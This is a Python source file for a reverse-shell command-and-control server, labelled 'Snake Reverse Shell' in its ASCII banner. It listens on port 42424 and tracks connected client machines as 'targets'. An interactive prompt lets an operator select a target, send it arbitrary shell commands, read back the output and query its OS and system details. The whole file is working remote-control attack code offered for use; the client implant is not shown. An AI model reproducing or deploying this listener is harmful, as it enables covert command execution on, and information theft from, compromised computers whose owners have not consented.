import socket
import sys
import threading
from _thread import *
import _thread
from queue import Queue
from time import sleep

# ------- CONSTANTS -------
HEADERSIZE = 10
number_of_threads = 2
job_number = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []
COMMANDS = {'help': ['Shows this help'],
            'list': ['Lists connected clients'],
            'select': ['Selects a client by its index. Takes index as a parameter'],
            'getos': ['Prints the OS of the selected client. To be used when client is selected'],
            'info': ['Prints information about the client machine, this command will work only if the client machine OS is Windows. To be used when client is selected'],
            'information': ['Prints information about the client machine, this command will work only if the client machine OS is not Windows. To be used when client is selected'],
            'quit': ['Stops current connection with a client. To be used when client is selected'],
            'shutdown': ['Shuts server down'],
            }

# Parts of the hello message
hello_message_1 = "__        __         _                                       _               ____                    _\n" \
                  "\ \      / /   ___  | |   ___    ___    _ __ ___     ___    | |_    ___     / ___|   _ __     __ _  | | __   ___ \n" \
                  " \ \ /\ / /   / _ \ | |  / __|  / _ \  | '_ ` _ \   / _ \   | __|  / _ \    \___ \  | '_ \   / _` | | |/ /  / _ \ \n" \
                  "  \ V  V /   |  __/ | | | (__  | (_) | | | | | | | |  __/   | |_  | (_) |    ___) | | | | | | (_| | |   <  |  __/\n" \
                  "   \_/\_/     \___| |_|  \___|  \___/  |_| |_| |_|  \___|    \__|  \___/    |____/  |_| |_|  \__,_| |_|\_\  \___|"
hello_message_2 = " ____                                                ____    _              _   _\n" \
                  "|  _ \    ___  __   __   ___   _ __   ___    ___    / ___|  | |__     ___  | | | |\n" \
                  "| |_) |  / _ \ \ \ / /  / _ \ | '__| / __|  / _ \   \___ \  | '_ \   / _ \ | | | |\n" \
                  "|  _ <  |  __/  \ V /  |  __/ | |    \__ \ |  __/    ___) | | | | | |  __/ | | | |\n" \
                  "|_| \_\  \___|   \_/    \___| |_|    |___/  \___|   |____/  |_| |_|  \___| |_| |_|\n"


# prints all the commands and their when "help" is typed in the interactive prompt
def help():
    for cmd, v in COMMANDS.items():
        print("{0}:\t{1}".format(cmd, v[0]))


def setup():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("", 42424))  # bind the socket to every possible way to reach the machine on port 42424
    s.listen(10)  # listen to up to 10 connections
    print("[*] Waiting for connections")


def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while True:
        try:
            lock = threading.Lock()
            clientsocket, address = s.accept()
            clientsocket.setblocking(True)
            all_connections.append(clientsocket)
            all_addresses.append(address)
            print(f"\nConnection from {address[0]}:{address[1]} has been established.")
        except ValueError as e:
            print("Error accepting connections. Exception: {}".format(e))


# Interactive prompt for sending commands remotely
def start_snake():
    sleep(0.5)
    while True:
        try:
            cmd = input("snake> ")
        except EOFError:
            pass
        if "list" in cmd:
            list_connections()
        elif "select" in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        elif "shutdown" in cmd:
            # Close all jobs
            queue.task_done()
            queue.task_done()
            # Exit the program completely
            quit()
        elif "help" in cmd:
            help()
        else:
            print("snake: Command \'{}\' is not recognized".format(cmd))


# Displays all current connections
def list_connections():
    results = "id      IP          Port\n"
    for i, connection in enumerate(all_connections):
        try:
            check_alive_msg = "check alive test"
            check_alive_msg = f"{len(check_alive_msg):<{HEADERSIZE}}" + check_alive_msg
            connection.send(bytes(check_alive_msg, "utf-8"))
            connection.recv(1024)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + "   " + str(all_addresses[i][0]) + "   " + str(all_addresses[i][1]) + "\n"
    print("------- Clients ------" + "\n" + results)


# Select a target client
def get_target(cmd):
    try:
        target = cmd.replace("select ", "")
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to {}".format(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + "> ", end="")
        return conn
    except:
        print("Not a valid selection")
        return None


# Connect with remote target client
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == "quit":
                break
            if len(str.encode(cmd)) > 0:
                cmd = f"{len(cmd):<{HEADERSIZE}}" + cmd
                conn.send(bytes(cmd, "utf-8"))
                client_response = ""
                is_new = True
                while True:
                    try:
                        msg = conn.recv(16)
                    except ConnectionResetError:
                        print("Connection has been closed by the client")
                        return
                    if is_new:
                        try:
                            response_len = int(msg[:HEADERSIZE])
                        except ValueError:
                            print("Error while getting the command length")
                            continue
                        is_new = False
                    client_response += msg.decode("utf-8")
                    if len(client_response) - HEADERSIZE == response_len:
                        print(client_response[HEADERSIZE:], end="")
                        break
        except Exception as e:
            print("Connection was lost. Exception: {}".format(e))
            break


# Create worker threads
threads = []


def create_workers():
    for _ in range(number_of_threads):
        t = start_new_thread(work, (None, None))
        threads.append(t)


# Do the next job in the queue (one handles connections,  other sends commands)
def work(h, g):
    while True:
        x = queue.get()
        if x == 1:
            setup()
            accept_connections()
        if x == 2:
            start_snake()
        queue.task_done()


# Each list item is a new job
def create_jobs():
    for x in job_number:
        queue.put(x)
    queue.join()


if __name__ == "__main__":
    print(hello_message_1)
    print(hello_message_2)
    print("type \'help\' to get the list of all commands")
    create_workers()
    create_jobs()
